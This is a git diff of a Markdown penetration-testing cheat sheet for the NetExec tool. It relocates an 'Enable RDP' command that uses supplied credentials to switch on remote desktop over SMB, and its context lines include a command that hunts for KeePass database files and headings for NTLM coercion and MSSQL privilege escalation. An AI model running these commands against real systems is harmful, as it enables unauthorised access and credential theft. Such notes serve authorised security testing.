@@ -296,12 +296,6 @@ flatpak run org.keepassxc.KeePassXC
 Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue -Path C:\ -Include *.kdbx
 ```
 
-### Enable RDP
-
-```bash
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
-```
-
 ### `drop-sc`, `slinky`, and `scuffy` NTLM Coercion via Writable Share
 
 - Run the same below commands with `CLEANUP=True` to delete file
@@ -527,6 +521,14 @@ nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
 ```
 
 ## RDP
+
+### Enable RDP
+
+**NOTE:** this runs over `smb`... the target user will need be a part of "Remote Desktop Users"
+
+```bash
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
+```
 
 ### Screenshot (no creds, NLA disabled)
 ```bash
